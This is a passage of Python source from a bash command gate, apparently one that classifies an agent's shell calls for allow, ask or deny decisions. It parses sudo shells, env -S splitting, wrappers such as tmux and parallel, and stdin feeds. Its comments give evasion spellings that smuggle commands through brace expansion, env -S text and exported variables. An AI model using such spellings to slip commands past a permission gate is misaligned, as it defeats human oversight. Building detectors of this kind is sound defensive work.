    value that may make several words (`-u $U`, _sudo_splits): a brace set there is expanded and its words read as
    option words (`-u {root,-s}` is `-u root -s`). Such a word may also take the next word as its value, so when
    the line feeds the command a stdin (``fed``), the shell is also read with no command."""
    memo = _call_memo.get()
    left = memo.setdefault(("sudo", "branches"), [_SUDO_BRANCHES]) if memo is not None else [_SUDO_BRANCHES]
    out = []
    for n, (prog, words, start) in enumerate(sudos):
        seen = set()
        for shell, ws, i, unsure, how in _sudo_read(prog, words, start, "", False, left):
            rest = i < len(ws)
            if shell == "" and how not in ("moved", "past") or how == "may" and not rest and not fed:
                continue
            for e in ((n, shell, ws, i, unsure, how),) + (((n, shell, ws, len(ws), unsure, how),)
                                                         if unsure and fed and rest and shell else ()):
                key = (e[1], len(e[2]) - e[3], id(e[2][e[3]]) if e[3] < len(e[2]) else 0,
                       e[5] if e[3] < len(e[2]) or how == "past" else "")
                if key not in seen:
                    seen.add(key)
                    out.append(e)
    return out


# bash's reserved words, which a shell reads otherwise as a command's first word
_SUDO_KEYWORDS = frozenset("case coproc do done elif else esac fi for function if in select then time until while"
                           .split())


def _sudo_shell_parts(sudos: list, words: list, k: _Cmd, cmd: str, depth: int, ctx: dict,
                      piped: str | None) -> list[Classification]:
    """#491: the parts of what the shell a sudo -s or -i starts runs, beside the line's own reading. With no command,
    that shell runs its stdin, read as `bash` with no operand reads it: an opaque part that runs it (_runs_stdin),
    and the parts of each text the line feeds it (a pipe, a here-string, a heredoc). A stdin the gate cannot read (a
    file, a variable, a process substitution) leaves that ask. With a command, sudo runs `$SHELL -c` on its words
    joined with spaces, each character but a letter, a digit, `_`, `-` and `$` escaped with a backslash (sudo(8)),
    so the shell expands a `$` again and drops a newline, as a line continuation. That text is read where it may
    not be the words the line's own reading took (``words``): a `$`, a newline, an empty word, or an option of
    sudo's that _strip_prefix_words reads otherwise (`-iu root`). An opaque part beside it keeps the ask the line
    had when its own reading was an unknown program. A word the gate cannot read asks. A brace value that moves
    where the options end (`-u {root,-p} echo rm`) has its command read as sudo runs it, with no shell. A reading
    where a word may take the next one as its value reads its command both ways, as the shell would and as sudo
    runs the words bash expanded (a sudo there with a brace value: `-E{,p} echo sudo -E{,p} echo rm`), and adds
    only what that command is known to do: a command the gate cannot read there asks nowhere else (`sudo -u $U cat
    f` stays a read), but a cap it met (_too_deep, the budget) asks (_a_cap). Only the first text read here is read
    from the sudos after it as written: it holds them, and that reading reads them in turn (one per level, not each
    again); their moved and may readings read words that text holds as literals, and are read here. A text read
    back as its words is not parsed again for a later sudo as written, whose words are a part of it."""
    parts: list[Classification] = []
    reread: int | None = None             # the sudo whose command was read again: it holds the sudos after it
    fed = _own_stdin(k) or k.piped_in or k.fed or k.stdin_unknown
    own = [w.text for w in words]
    same: list = []                       # the longest command a parse read back as its words
    done: set = set()
    for n, shell, src, i, unsure, how in _sudo_shells(sudos, fed):
        size = len(src) - i               # the command is src[i:], made a list only when it is read
        what, exact = f"{sudos[n][0]} {shell}".strip(), how == "as written" or how == "moved" and bool(shell)
        if size and reread is not None and n > reread and how == "as written":
            continue                      # a moved or may reading reads words the text read again does not hold
        if not size and (how == "past", unsure, bool(shell)) in done:
            continue                      # one of each kind: each reads the same stdin
        if not size:
            done.add((how == "past", unsure, bool(shell)))
        if how == "past":
            parts.append(_opaque(f"{what[:40]}: more of its options may take the next word than the gate reads", cmd))
            continue
        if not size:
            if not shell:
                continue
            starts = "may start" if unsure else "starts"
            parts.append(_runs_stdin(_opaque(f"{what} {starts} a shell, which runs its stdin"[:120], cmd), k))
            if depth < _DEPTH:
                parts += _once(ctx, (classify_shell, depth + 1), k, piped, lambda t: [classify_shell(t, depth + 1)])
            continue
        tail = 0 < len(words) <= size and own == [w.text for w in src[len(src) - len(words):]]
        if how == "as written" and tail and size <= len(same) and src[i] is same[len(same) - size] and \
                src[i].text not in _SUDO_KEYWORDS:
            continue                      # a part of a text read back as its words: each word there reads alone
        rest = src[i:]
        runs: list[tuple[list, bool]] = []    # each command read, and whether all its parts count
        if not shell or how == "may":     # sudo may run the words itself, as bash expanded them, with no shell
            if [w.text for w in rest] != own:
                runs.append((rest, False))
        if shell:
            if exact and any(w.dynamic for w in rest):
                parts.append(_opaque(f"{what} passes its shell a word the gate cannot read, which it expands again"
                                     [:120], cmd))
            text = " ".join(re.sub(r"([^A-Za-z0-9_$-])", r"\\\1", w.text) for w in rest)
            ws = [w for c in _parse(text)[0] for w in c.words]
            if tail and [(w.text, w.dynamic) for w in ws] == [(w.text, False) for w in rest]:
                same, ws = rest if len(rest) > len(same) else same, []
            if ws:
                runs.append((ws, exact))
        for ws, whole in runs:
            if whole:
                reread = n if reread is None else reread
                parts.append(_opaque(f"{what} runs its command through a shell, which reads other words"[:120], cmd))
            if depth >= _DEPTH:
                parts.append(_too_deep(cmd))
                continue
            got = _classify_simple(_wrapped(k, ws), cmd, depth + 1, ctx, piped)
            # a reading that may not be bash's adds what its command is known to do, not a command it cannot read,
            # and a cap it met (_too_deep, a sudo's budget): a nest cut short there asks
            parts += got if whole else [q for p in got for q in (
                [p] if p.category not in ("read", "opaque_exec") else [x for x in _each_part(p) if _a_cap(x)])]
    return parts


def _a_cap(p: Classification) -> bool:
    """Whether p stands for text a cap left unread: a nest past _DEPTH or _NEST (_too_deep), or a sudo's options
    past the call's budget of readings (_sudo_shell_parts)."""
    return p.category == "opaque_exec" and p.summary.endswith(_CAP_ENDS)


def _env_split_argv(split: str) -> str | None:
    """The command a -S text's leading words name, read as env reads them, as its own argv (#591): env splits the
    text into words and reads them itself, so a word quoted whole with the form NAME=value is an assignment, and
    the first word that is neither an option nor an assignment starts the command. Returns the text from that word
    on, or None when the shell line over the text already reads it: no leading word consumed, no command at all, a
    split inside the split, or a shell operator before the command. Kept as #634 read the text, in a reading of its
    own (classify, mode 1), so nothing it found is lost. It splits the text as a shell line does and takes the word
    after `--` for the command; env does neither (it still reads `NAME=value` after `--`, and `;` is a character of
    a word to it), and the first reading reads the text as env splits it (_env_split_lines)."""
    toks = _Lexer(split or "", scan=False).run()
    words = [t for k, t in toks if k == "w"]
    n, i = -1, 0
    while i < len(words):
        t = words[i].text
        if _ASSIGN.fullmatch(t):          # env reads its own argv, so a quoted NAME=value is an assignment too
            i += 1
            continue
        if not t.startswith("-") or t == "-":
            n = i
            break
        f, i = t, i + 1
        if f in ("-S", "--split-string") or f.startswith(("--split-string=", "-S")):
            return None
        if f == "--":
            n = i                         # #634 took the next word for the command (see the docstring)
            break
        if f in _PREFIXES["env"] and i < len(words):
            i += 1                        # a value of its own (`-u NAME`, `--chdir DIR`)
    if n <= 0 or n >= len(words):
        return None
    # an operator before the command word is a word of argv to env, and the shell line over the text
    # covers the commands after it
    seen = 0
    for k, _ in toks:
        if k != "w":
            if seen <= n:
                return None
            break
        seen += 1
    return " ".join(w.raw for w in words[n:])


# #591 follow-up: how a reading of the call reads an `env -S` text beside the text as a shell line, and a mark of what
# it read there. classify sets it: 2 the line env runs (_env_split_lines), its first reading; 0 nothing more, as before
# #634; 1 #634's leading words (_env_split_argv); 3 as 0. In 2 and 3 every spelling of -S reads as `-S TEXT` does
# (_env_s_text): its text a shell line with the opaque part, and no environment dump. Unset (a classify_shell call
# outside classify): 2, each spelling as main read it.
_env_split_mode: contextvars.ContextVar[tuple[int, list[int]] | None] = contextvars.ContextVar(
    "exo_gate_env_split_mode", default=None)


_ENV_S_WORD = re.compile(r"-([^-uCS][^uCS]*)?S(.*)", re.S)     # -S in a word of short options (`-iS`, `-i0vS..`)


def _env_s_text(f: str) -> bool:
    """Whether this reading of the call reads the env option word ``f`` as `-S TEXT` (_env_split_mode 2 or 3, set by
    classify): -S in a word of short options, or a prefix of --split-string. It then marks the call for the reading
    as before (mode 0), which keeps what main read there (an environment dump for an option word alone)."""
    name, ms = f.partition("=")[0], _env_split_mode.get()
    if ms is None or ms[0] not in (2, 3) or not (_ENV_S_WORD.fullmatch(f) or len(name) > 2 and
                                                 "--split-string".startswith(name)):
        return False
    ms[1][0] |= 1
    return True


def _env_split_lines(words: list, raw: bool = False) -> list[str]:
    """#591: the simple command GNU env runs for an `env -S TEXT` among the prefixes of ``words``, in each spelling
    env 9.4 takes: `-S TEXT`, `-STEXT` (the text whole: only `--split-string=` splits at its `=`), `--split-string=TEXT`
    or `--split-string TEXT` and each unambiguous prefix of it (`--split`), and -S in a word of short options
    (`-iS`, `-i0vS`). It is the words before it, TEXT split as env splits it (_env_split) and the words after it, as
    a line of quoted words. env reads the split words as its own argv, so that line reads as the same command
    without -S does: an assignment quoted whole or after `--`, or with `;` in it, is an assignment (`env 'X=a b;x'
    rm`). A text with a shell expansion in it gives the words env closes before the first one (_shell_cut), the rest
    of the shell word as one word; and a second line when the rest splits otherwise with each expansion one piece of
    the word it sits in (_shell_parts: `$BR --force` is two words to env). No line without one, when env would
    refuse the text, or when no word of it closes before an expansion (`env -S "$CMD"`). With ``raw``, the text as
    main reads -S's (an attached one alone, else the words from it on, joined) and the option word (_env_s_text)."""
    i, own_argv, quoted_value = 0, False, not _as_before.get()
    while i < len(words):
        w = words[i]
        if _prefix_assign(w, own_argv, quoted_value):     # a quoted prefix assignment hides no -S text (#471)
            i += 1
            continue
        base = w.text.rsplit("/", 1)[-1]
        if w.dynamic or base not in _PREFIXES or base == "command" and words[i + 1:i + 2] and \
                words[i + 1].text in ("-v", "-V"):
            return []
        own_argv, takes, i = base in ("env", "sudo"), _PREFIXES[base], i + 1
        while i < len(words) and words[i].text.startswith("-") and words[i].text != "-":
            f, i = words[i].text, i + 1
            if base == "env" and f == "--":
                break
            name, eq, val = f.partition("=")
            # -S in a word of short options; one that takes a value (-u, -C) before it takes the rest
            m = _ENV_S_WORD.fullmatch(f) if base == "env" else None
            if base == "env" and len(name) > 2 and "--split-string".startswith(name):
                text: str | None = val if eq else None
            elif m:
                text = m[2] or None
            else:
                i += bool(i < len(words) and (f in takes or base == "env" and (re.fullmatch(r"-[^-uCS]*[uC]", f) or (
                    not eq and len(name) > 2 and any(t.startswith(name) for t in ("--unset", "--chdir"))))))
                continue
            at, tail = i - 1, ""
            if text is None:
                if i >= len(words):
                    return []
                text, i = words[i].text, i + 1
                if raw:
                    return [" ".join(x.text for x in words[i - 1:]), f]
            if raw:
                return [text, f]
            if words[i - 1].dynamic:
                # A shell expansion in the text: the words env closes before it are read, and the rest of the shell
                # word stands for the rest of the text (_shell_cut), as one word that may hold an expansion.
                cut, lead = _shell_cut(words[i - 1]), len(words[i - 1].text) - len(text)   # lead: the option
                if cut is None or len(cut[0]) < lead:
                    return []
                text, tail = cut[0][lead:], cut[1]
            split = _env_split(text, tail)
            if split is None:
                return []
            head = [x.raw or shlex.quote(x.text) for x in words[:at]] + (["-" + m[1]] if m and m[1] else [])
            rest = [x.raw or shlex.quote(x.text) for x in words[i:]]
            # The rest split by env's rules, each expansion a piece of the word it sits in. The value may hold a
            # quote that joins what follows, so the one-word reading above stays beside it.
            parts = _shell_parts(tail) if tail and "\0" not in text else None
            more = None if parts is None or any("\0" in s for exp, s in parts if not exp) else \
                _env_split(text + "".join("\0" if exp else s for exp, s in parts), exps=[s for exp, s in parts if exp])
            line, other = " ".join(head + split + rest), " ".join(head + (more or []) + rest)
            return [line] + [other] * bool(more and other != line)
        if base == "timeout" and i < len(words) and re.fullmatch(r"[\d.]+[smhd]?", words[i].text):
            i += 1
    return []


def _shell_cut(w: _Word) -> tuple[str, str] | None:
    """A word with a shell expansion in it (#591): its text before the first expansion, and the rest of its source as
    a shell word of its own (a double quote open there opened again). None when the lexer reads that start otherwise."""
    raw, dq, i = w.raw, False, 0
    while i < len(raw) and not (raw[i] in "$`" or i == 0 and raw[i] in "<>"):
        if raw[i] == "\\":
            i += 1
        elif raw[i] == "'" and not dq:
            j = raw.find("'", i + 1)
            i = len(raw) if j < 0 else j
        elif raw[i] == '"':
            dq = not dq
        i += 1
    toks = [t[1] for t in _Lexer(raw[:i], scan=False).run() if t[0] == "w"]
    head = toks[0].text if toks else ""
    if i >= len(raw) or len(toks) > 1 or not w.text.startswith(head):
        return None
    return head, '"' * dq + raw[i:]


def _shell_parts(src: str) -> list[tuple[bool, str]] | None:
    """The pieces of a shell word's source (#591, the rest _shell_cut gives): (False, the text the shell gives) and
    (True, an expansion's source, in the double quotes it sat in). None when a piece reads otherwise."""
    out: list[tuple[bool, str]] = []
    dq, i = False, 0
    while True:
        a, was = i, dq
        while i < len(src) and src[i] not in "$`":     # as _shell_cut scans
            if src[i] == "\\":
                i += 1
            elif src[i] == "'" and not dq:
                j = src.find("'", i + 1)
                i = len(src) if j < 0 else j
            elif src[i] == '"':
                dq = not dq
            i += 1
        toks = [t[1] for t in _Lexer('"' * was + src[a:i] + '"' * dq, scan=False).run() if t[0] == "w"]
        if len(toks) > 1 or toks and toks[0].dynamic:
            return None
        if toks and toks[0].text:
            out.append((False, toks[0].text))
        if i >= len(src):
            return out
        lx, w = _Lexer(src, scan=False), _Word()
        lx.i = i
        if src[i] == "`":
            lx._backtick(w, dq)
        else:
            lx._dollar(w, dq)
        out.append((True, '"' * dq + src[i:lx.i] + '"' * dq) if w.dynamic else (False, w.text))
        i = lx.i


_ENV_ESCAPES = {'"': '"', "#": "#", "$": "$", "'": "'", "\\": "\\", "f": "\f", "n": "\n", "r": "\r", "t": "\t",
                "v": "\v"}
_ENV_VAR = re.compile(r"\{([A-Za-z_]\w*)\}", re.A)


def _env_split(text: str, tail: str = "", exps: tuple | list = ()) -> list[str] | None:
    """The words GNU env's -S splits ``text`` into (build_argv in coreutils' env.c), each quoted for a shell line:
    quotes, the backslash escapes, `\\_` between words, `#` at a word's start and `\\c` end the text; `;`, `&`, `|`
    and `>` are characters of a word. A ${NAME} env fills from its environment stays "${NAME}", and a word of
    ${NAME}s only stays unquoted, as it may give no word (env gives none for an unset NAME but an empty word for a
    set, empty one; in the command's place either is a program from a variable, which is opaque). None where env
    refuses the text and runs nothing (an unclosed quote, an unknown escape, a `$` not in ${NAME}), and where a `#`
    follows ${NAME}s only (a comment when they are empty). With ``tail``, ``text`` is the -S text only up to a shell
    expansion and ``tail`` the shell source from there (_shell_cut): the words closed before the end stand, as later
    text cannot change them, and the word open there (or a new one) ends with ``tail``. None then also when no word
    closes before the end, as the program may come from the expansion. With ``exps``, each NUL in ``text`` stands
    for the value of the shell expansion ``exps`` holds at its turn (_shell_parts), a piece of the word it sits in
    that may be empty, as a ${NAME} is; None then also where an escape goes on in it. Each word's text is joined
    once (_env_word), so the split takes time linear in the text."""
    words: list[list[list]] = []        # each word's pieces: [False, its text's parts], [True, [a NAME]] or
    sq = dq = bare = ended = False      # ["sh", [an expansion's source]]; bare: the open word holds those only
    sep, i, k = True, 0, 0

    def put(s: str, var: bool | str = False) -> None:
        nonlocal sep, bare
        if sep:
            words.append([])
            sep, bare = False, True
        bare = bare and bool(var)
        if words[-1] and not var and not words[-1][-1][0]:
            words[-1][-1][1].append(s)
        else:
            words[-1].append([var, [s]])

    while i < len(text):
        ch, i = text[i], i + 1
        if ch == "\0" and k < len(exps):
            put(exps[k], "sh")
            k += 1
        elif ch == "\\" and text[i:i + 1] == "\0" and k < len(exps):     # the escape goes on in the value
            return None
        elif ch == "'" and not dq or ch == '"' and not sq:
            sq, dq = (not sq, dq) if ch == "'" else (sq, not dq)
            put("")
        elif ch in " \t\n\v\f\r" and not (sq or dq):
            sep = True
        elif ch == "#" and (sep or bare):
            if not sep:
                return None
            ended = True
            break
        elif ch == "\\" and not (sq and text[i:i + 1] not in ("\\", "'")):
            if tail and i == len(text):     # the escape goes on in the expansion
                break
            nxt, i = text[i:i + 1], i + 1
            if nxt == "_" and not dq:
                sep = True
            elif nxt == "c" and not dq:
                ended = True
                break
            elif nxt == "_" or nxt in _ENV_ESCAPES:
                put(" " if nxt == "_" else _ENV_ESCAPES[nxt])
            else:
                return None
        elif ch == "$" and not sq:
            m = _ENV_VAR.match(text, i)
            if not m:
                if tail and re.fullmatch(r"(\{([A-Za-z_]\w*)?)?", text[i:], re.A):  # ${NAME} goes on in it
                    break
                return None
            put(m[1], True)
            i = m.end()
        else:
            put(ch)
    else:
        if (sq or dq) and not tail:
            return None
    out = [_env_word(w) for w in words]
    if not tail or ended:
        return out
    if len(words) - (not sep) < 1:
        return None
    return out + [tail] if sep else out[:-1] + [out[-1] + tail]


def _env_word(pieces: list[list]) -> str:
    """One word of _env_split, quoted for a shell line: a ${NAME} in double quotes, a word of ${NAME}s only bare, a
    shell expansion as its source spells it."""
    joined = [(var, "".join(s)) for var, s in pieces]
    if all(var is True for var, _ in joined):
        return "".join(f"${{{s}}}" for _, s in joined)
    return "".join(s if var == "sh" else f'"${{{s}}}"' if var else shlex.quote(s) if s else ""
                   for var, s in joined) or "''"


def _wrapper_args(argv: list[str], i: int, takes: tuple, permute: bool = False) -> tuple[int, list]:
    """Read a wrapper's options from argv[i] as getopt does: up to the first operand (past it with `permute`)
    or `--`, `--opt=value` or `--opt value` (an unambiguous prefix of four letters or more counts), short
    options clustered (`-qc`, `-n5`). Returns the index of the first operand and the (option, value) pairs read."""
    seen: list[tuple[str, str]] = []
    while i < len(argv):
        a = argv[i]
        i += 1
        if a == "--":
            break
        if not a.startswith("-") or a == "-":
            if not permute:
                return i - 1, seen
        elif a.startswith("--"):
            name, eq, val = a.partition("=")
            full = [t for t in takes if len(name) > 5 and t.startswith(name) and not t.endswith("=")]
            name = name if name in takes or len(full) != 1 else full[0]
            if not eq and name in takes and i < len(argv):
                val, i = argv[i], i + 1
            seen.append((name, val))
        else:
            for k, ch in enumerate(a[1:], 2):
                if "-" + ch in takes or "-" + ch + "=" in takes:
                    val = a[k:]
                    if not val and "-" + ch in takes and i < len(argv):
                        val, i = argv[i], i + 1
                    seen.append(("-" + ch, val))
                    break
                seen.append(("-" + ch, ""))
    return i, seen


def _classify_wrapper(prog: str, words: list, cmd: str, depth: int, inner_words) -> list[Classification]:
    """A wrapper that runs a command (#160): setsid, flock, chroot, watch, script -c, tmux, screen, parallel...
    The command is classified as a nested command beside an opaque part, like the command after xargs: the line
    asks as before, and a deny on what runs applies when its category outranks opaque_exec (until D-075). A
    command the gate cannot find or read stays opaque."""
    argv = [w.text for w in words]
    head = _opaque(f"{prog}: {_OPAQUE_PROGRAMS.get(prog, 'runs a command')}", cmd)
    parts, texts, rest = [head], [], []
    if prog == "screen":
        multi = {"-Logfile": "--logfile", "-ls": "-Q", "-list": "-Q", "-wipe": "-Q", "-fn": "--fn", "-fa": "--fa",
                 "-ln": "--ln"}
        i, seen = _wrapper_args([multi.get(a, a) for a in argv], 1, _WRAPPERS[prog] + ("--logfile",))
        opts = {o for o, _ in seen}
        # -r and -x reattach, -ls, -wipe and -Q query: nothing new runs. -R reattaches, or starts the command when
        # no session is detached; it is not read and asks (a known limit). -X sends a screen command; its
        # `screen` command opens a window that runs argv. Otherwise the argv after the options runs.
        if "-X" not in opts and not {"-r", "-R", "-x", "-Q"} & opts:
            rest = words[i:]
        elif "-X" in opts and argv[i:i + 1] == ["screen"]:
            j, _ = _wrapper_args(argv, i + 1, ("-t", "-T", "-h"))
            rest = words[j + 1:] if argv[j:j + 1] and argv[j].isdigit() else words[j:]
    elif prog == "tmux":
        i, seen = _wrapper_args(argv, 1, _WRAPPERS[prog])
        texts = [v for o, v in seen if o == "-c"]
        # A command list, split as tmux splits it (cmd_parse_from_arguments): an argument whose last character is
        # `;` ends a command and loses the `;` (`';'`, `'sleep 3;'`); one ending in `\;` does not end it and
        # reads as ending in `;`.
        cmds: list[list[str]] = [[]]
        for a in argv[i:]:
            if a.endswith("\\;"):
                cmds[-1].append(a[:-2] + ";")
            elif a.endswith(";"):
                cmds[-1] += [a[:-1]] if a[:-1] else []
                cmds.append([])
            else:
                cmds[-1].append(a)
        for sub_argv in cmds:
            sub = _TMUX_ALIASES.get(sub_argv[0], sub_argv[0]) if sub_argv else ""
            if sub in _TMUX_RUNS:
                j, flags = _wrapper_args(sub_argv, 1, tuple("-" + c for c in _TMUX_RUNS[sub]))
                body = sub_argv[j:]
                if body and not (sub == "run-shell" and ("-C", "") in flags):
                    texts.append(body[0] if len(body) == 1 else shlex.join(body))
    elif prog == "parallel":
        i, _ = _wrapper_args(argv, 1, _WRAPPERS[prog])
        seps = (":::", "::::", ":::+", "::::+")
        j = next((k for k in range(i, len(argv)) if argv[k] in seps), len(argv))
        template = " ".join(argv[i:j])
        if template:
            # Each argument is appended to the template, or put where {} stands, and the line runs in a shell.
            # Only on the line itself and up to four times this command's own length, sized before any text is
            # built: a template can be a parallel line too, and reading every argument at each level would
            # multiply the work. The template is also read alone.
            args = argv[j + 1:] if argv[j:j + 1] == [":::"] and not depth else []
            args = list(dict.fromkeys(args[:next((n for n, a in enumerate(args) if a in seps), len(args))]))[:16]
            budget, slots = 4 * sum(len(a) + 1 for a in argv), template.count("{}")
            for a in args if slots or "{" not in template else []:
                q = shlex.quote(a)
                budget -= len(template) + (slots * (len(q) - 2) if slots else len(q) + 1)
                if budget < 0:
                    break
                texts.append(template.replace("{}", q) if slots else f"{template} {q}")
            texts.append(template)
    else:
        i, seen = _wrapper_args(argv, 1, _WRAPPERS[prog], permute=prog == "script")
        texts = [v for o, v in seen if prog in ("flock", "script") and o in ("-c", "--command")]
        i += _WRAPPER_OPERANDS.get(prog, 0)
        if prog == "flock" and argv[i:i + 1] in (["-c"], ["--command"]):
            texts.append(argv[i + 1] if i + 1 < len(argv) else "")
        elif prog == "watch" and not {("-x", ""), ("--exec", "")} & set(seen):
            texts.append(" ".join(argv[i:]))         # watch runs the words joined through `sh -c`
        elif prog != "script":
            rest = words[i:]
    for text in texts:
        parts.append(classify_shell(text, depth + 1) if depth < _DEPTH else _too_deep(cmd))
    parts += inner_words(rest)
    if _env_dump(_strip_prefixes_keep_env([w.text for w in rest])[0]):   # as for coproc and the prefixes (#155)
        parts.append(_make("credentials", summary="shell touching environment dump", command=cmd,
                           signals=["secret store"]))
    shown = " ".join(w.text for w in rest) or "; ".join(t for t in texts if t)
    if shown:
        head.summary = f"{prog} runs {shown}"[:120]
    if prog in _PRIVILEGED_WRAPPERS:
        head.signals.append(prog)
        for p in parts:
            _run_privileged(p)
    return parts


def _trusted_path(prog: str) -> bool:
    """A program named by path runs as itself only from a system bin folder or a virtualenv/node bin."""
    p = _expand_text(prog)
    if _ENV_BIN.search(p):
        return True
    return p.startswith("/") and os.path.dirname(os.path.normpath(p)) in _SYSTEM_BIN


def _expands(w: _Word) -> bool:
    """Whether bash may turn a word into other text or into several words (#208): a `$` expansion or backticks,
    a brace expansion (`Zo{r,}k`, `{1..3}`), a glob character, or a leading `~`. `{owner}` with no comma or
    `..` stays as it is."""
    return (w.dynamic or w.raw.startswith("~") or (w.glob and bool(re.search(r"[*?\[]", w.text)))
            or (w.brace and bool(re.search(r"\{[^}]*(,|\.\.)[^}]*\}", w.text))))


def _gh_splits(w: _Word) -> bool:
    """Whether bash may make several words of ``w``, or none (round 6 of #399): a glob, a brace expansion, or an
    expansion the lexer read outside double quotes, or `"$@"` or `"${name[@]}"` in them (_Word.split). `"$R"` and
    `"$(cat r)"` are one word. The lexer reads a `$(..)` or backtick body as bash does, quotes in it too, so
    `"$(: ")")"$R` holds `$R` outside quotes (round 7). A word the gate made itself has no source to read, so an
    expansion in it may split."""
    return (w.split or (w.dynamic and not w.raw) or (w.glob and bool(re.search(r"[*?\[]", w.text)))
            or (w.brace and bool(re.search(r"\{[^}]*(,|\.\.)[^}]*\}", w.text))))


def _literal_stdin(k: _Cmd, piped: str | None) -> str | None:
    """A command's stdin when the line spells it out and bash changes nothing in it (#208): its one heredoc with
    a quoted delimiter, or with no `$`, backtick or backslash in the body (bash expands those and joins a line
    ending in `\\`); its one here-string with no expansion; or ``piped``, what `_literal_pipe` read from the one
    simple command writing the pipe. None for a `<` redirection, more than one source, or a stdin the gate
    cannot see (a compound's, `exec <`, the tool's own)."""
    docs = [h for h in k.heredocs if not h.fd.lstrip("0")]          # a heredoc on fd 3 is not stdin
    strings = [w for w in k.herestrings if not w.fd.lstrip("0")]
    if any(op in _READ_REDIRS for op, _ in k.redirs) or len(docs) + len(strings) > 1:
        return None
    if docs:
        h = docs[0]
        return h.body if not h.ambiguous and (h.quoted or not re.search(r"[$`\\]", h.body)) else None
    if strings:
        return None if _expands(strings[0]) else strings[0].text
    return piped


def _literal_pipe(w: _Cmd | None) -> str | None:
    """What one simple command writes to a pipe, when bash and the program change nothing in it (#208): `cat`
    with no arguments and a literal heredoc or here-string (`_literal_stdin`), `echo` with no option word and
    no backslash, or `printf` with one format and no `%` or backslash in it. Anything else (escapes, formats,
    options, a redirection, an expansion, another program) is None: the gate cannot tell what the pipe carries."""
    if w is None or w.redirs or not w.words or any(_expands(x) for x in w.words):
        return None
    prog, args = w.words[0].text, [x.text for x in w.words[1:]]
    if prog == "cat" and not args:
        return _literal_stdin(w, None)
    if w.heredocs or w.herestrings or "\\" in "".join(args):
        return None
    if prog == "echo" and not any(a.startswith("-") for a in args):
        return " ".join(args)
    if prog == "printf" and len(args) == 1 and "%" not in args[0] and not args[0].startswith("-"):
        return args[0]
    return None


def _stdin_texts(k: _Cmd, piped: str | None) -> list[str]:
    out = [h.body for h in k.heredocs] + [w.text for w in k.herestrings]
    if piped is not None:
        out.append(piped)
    return list(dict.fromkeys(out))


# A compound command's closing word, and the openers it closes.
_COMPOUND_CLOSERS = {"}": ("{",), "done": ("while", "until", "for", "select"), "fi": ("if",), "esac": ("case",)}
_COMPOUND_OPENERS = frozenset(o for names in _COMPOUND_CLOSERS.values() for o in names)
_READ_REDIRS = ("<", "<&", "<>")


def _command_word(words: list, lead: bool, pre: int) -> bool:
    """Whether the next word is in command position: only reserved words before it (lead, which the parser keeps
    so this is O(1)), or a `coproc [NAME]` or `function NAME` that starts at words[pre]."""
    return lead or (len(words) - pre <= 2 and not words[pre].quoted and words[pre].text in ("coproc", "function"))


def _own_stdin(k: _Cmd) -> bool:
    """Whether the command's own heredoc, here-string or `<` redirection sets its stdin. The lexer drops fd
    numbers, so `2<file` counts too: that command is not fed, as on main."""
    return bool(k.heredocs or k.herestrings) or any(op in _READ_REDIRS for op, _ in k.redirs)


def _wrapped(k: _Cmd, words: list) -> _Cmd:
    """The command a wrapper k runs (uv run, nsenter, flock, git bisect run...), read as its own command: it keeps
    k's heredocs and here-strings, and k's stdin for the #316 reading. A stdin of k the gate cannot read reaches it
    too: k's own `<` from anything but /dev/null, a pipe into k or a compound's feed (`uv run ssh h < cmds.sh`, `cat
    cmds.sh | uv run ssh h`, `{ uv run ssh h; } < cmds.sh`); a pipe whose text is known reaches it as `piped`. It
    reads the stdin of a fed line only when k does: k's own `<`, a pipe into k or a compound around k gives it
    another (`>(uv run ssh h < /dev/null)`). xargs is read so too, which reads more than runs: GNU xargs gives its
    command /dev/null unless -a names its input file (-o gives it the terminal), so that fails closed."""
    unread = k.stdin_unknown or k.piped_in or \
        any(op in _READ_REDIRS and not (op == "<" and t.text == "/dev/null") for op, t in k.redirs)
    return _Cmd(words=words, heredocs=k.heredocs, herestrings=k.herestrings, stdin_unknown=unread,
                stdin_apart=k.stdin_apart or k.fed or k.piped_in or _own_stdin(k))


def _sets_shell_stdin(k: _Cmd, fnames: set) -> bool:
    """Whether the compound's stdin stops being fed after this command. `exec < file` makes the file the
    stdin of every later command in that shell, and bash reaches it however exec is spelled or prefixed
    (`"exec"`, `\\exec`, `command exec`, `X=1 exec`, `time exec`) and unseen through eval, source, `.`, a
    program name from a variable or a function defined on the line. So any of those stops the feed, and
    the later commands keep main's reading."""
    w = next((w for w in k.words if not (w.text in _OPENERS or w.text in ("command", "time", "-p")
                                         or _ASSIGN.fullmatch(w.text))), None)
    if w is None:
        return False
    return (w.dynamic or w.text in ("eval", "source", ".") or w.text in fnames
            or (w.text == "exec" and _own_stdin(k)))


# Builtins and keywords after which the shell runs the rest of the line differently (#394): they set or export a
# variable, an option, an alias, a function, a coprocess, the hash table, a trap or the folder stack, or run a file
# in this shell. _STATE_ALWAYS do so whatever their arguments, _STATE_OPERANDS when given any (alone they print).
# eval is not here: the gate reads its text as a nested line, whose own setters count. cd is left out on purpose,
# so `cd repo && cmd` stays under an allow rule whose regex finds cmd in the line. That cannot loosen a decision,
# since the rule must still match the whole line (docs/GATE.md, Known limits).
_STATE_ALWAYS = frozenset({"source", ".", "read", "mapfile", "readarray", "getopts", "let", "pushd", "popd",
                           "for", "select", "function", "coproc"})
_STATE_OPERANDS = frozenset({"hash", "alias", "enable", "unset", "trap"})


def _sets_state(k: _Cmd) -> bool:
    """Whether the simple command changes the shell for the commands after it on the line (#394): an assignment with
    no command, `export X`, `declare X=1` (any of _EXPORTERS with an operand), `set` with -a, -k or operands,
    `shopt -s`/`-u`, `printf -v`, `exec` with only redirections, a program name the gate cannot read, or one of the
    builtins above. Such a state lasts only as long as the shell, so it changes what a later command on the same
    line runs (`export GIT_SSH_COMMAND=..; git push`) where a separate call would start afresh."""
    words = list(k.words)
    while words and not words[0].quoted and words[0].text in _OPENERS:
        words = words[1:]
    if not words:
        return False
    if all(_ASSIGN.fullmatch(w.text) for w in words):
        return True
    # #471: a quoted prefix assignment was read as the program before (`X="$Y" ls`, a program from a variable); a
    # setter under either reading counts, so an allow rule must still name it
    return any(_program_sets_state(words, r[0], r[2]) for r in (_strip_prefix_words(words),
                                                                _strip_prefix_words(words, False)))


def _program_sets_state(words: list, rest: list, split: str | None) -> bool:
    """_sets_state for the words left after the prefixes (``rest``) in one reading of them."""
    if split is not None:
        return False                              # `env -S`: a command line, read as one
    if not rest:                                  # prefixes only: `exec 3>f` sets the fds later commands get
        return any(w.text.rsplit("/", 1)[-1] == "exec" for w in words)
    prog, args = rest[0], rest[1:]
    if prog.dynamic:
        return True
    name = prog.text
